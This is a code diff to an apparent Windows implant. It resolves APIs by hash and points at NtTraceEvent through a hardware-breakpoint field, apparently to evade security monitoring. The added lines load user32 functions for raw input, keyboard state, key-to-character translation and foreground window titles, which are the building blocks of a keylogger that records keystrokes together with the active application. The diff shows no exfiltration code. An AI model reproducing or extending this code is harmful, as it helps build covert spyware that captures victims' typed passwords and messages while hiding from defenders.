@@ -260,6 +260,7 @@ auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
 auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
     UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );
+    UPTR User32 = LoadModule(HashStr("user32.dll"));
 
     Instance->Win32.Ntdll = Ntdll;
     
@@ -312,6 +313,28 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.RtlExitUserThread  = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
     Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
     
+    Instance->Win32.RegisterClassExW = (decltype(Instance->Win32.RegisterClassExW))LoadApi(User32, HashStr("RegisterClassExW"));
+    Instance->Win32.CreateWindowExW = (decltype(Instance->Win32.CreateWindowExW))LoadApi(User32, HashStr("CreateWindowExW"));
+    Instance->Win32.RegisterRawInputDevices = (decltype(Instance->Win32.RegisterRawInputDevices))LoadApi(User32, HashStr("RegisterRawInputDevices"));
+    Instance->Win32.GetMessageW = (decltype(Instance->Win32.GetMessageW))LoadApi(User32, HashStr("GetMessageW"));
+    Instance->Win32.TranslateMessage = (decltype(Instance->Win32.TranslateMessage))LoadApi(User32, HashStr("TranslateMessage"));
+    Instance->Win32.DispatchMessageW = (decltype(Instance->Win32.DispatchMessageW))LoadApi(User32, HashStr("DispatchMessageW"));
+    Instance->Win32.PostQuitMessage = (decltype(Instance->Win32.PostQuitMessage))LoadApi(User32, HashStr("PostQuitMessage"));
+    Instance->Win32.GetRawInputData = (decltype(Instance->Win32.GetRawInputData))LoadApi(User32, HashStr("GetRawInputData"));
+    Instance->Win32.DefWindowProcW = (decltype(Instance->Win32.DefWindowProcW))LoadApi(User32, HashStr("DefWindowProcW"));
+    Instance->Win32.GetForegroundWindow = (decltype(Instance->Win32.GetForegroundWindow))LoadApi(User32, HashStr("GetForegroundWindow"));
+    Instance->Win32.GetWindowThreadProcessId = (decltype(Instance->Win32.GetWindowThreadProcessId))LoadApi(User32, HashStr("GetWindowThreadProcessId"));
+    Instance->Win32.GetWindowTextW = (decltype(Instance->Win32.GetWindowTextW))LoadApi(User32, HashStr("GetWindowTextW"));
+    Instance->Win32.GetKeyboardState = (decltype(Instance->Win32.GetKeyboardState))LoadApi(User32, HashStr("GetKeyboardState"));
+    Instance->Win32.GetKeyState = (decltype(Instance->Win32.GetKeyState))LoadApi(User32, HashStr("GetKeyState"));
+    Instance->Win32.ToUnicode = (decltype(Instance->Win32.ToUnicode))LoadApi(User32, HashStr("ToUnicode"));
+    Instance->Win32.MapVirtualKeyW = (decltype(Instance->Win32.MapVirtualKeyW))LoadApi(User32, HashStr("MapVirtualKeyW"));
+
+    Instance->Win32.HeapAlloc = (decltype(Instance->Win32.HeapAlloc))LoadApi(Kernel32, HashStr("HeapAlloc"));
+    Instance->Win32.GetProcessHeap = (decltype(Instance->Win32.GetProcessHeap))LoadApi(Kernel32, HashStr("GetProcessHeap"));
+
+    Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Kernel32, HashStr("RtlZeroMemory"));
+
     Instance->Hwbp.NtTraceEvent   = (PVOID)LoadApi(Ntdll, HashStr("NtTraceEvent"));
 }
 
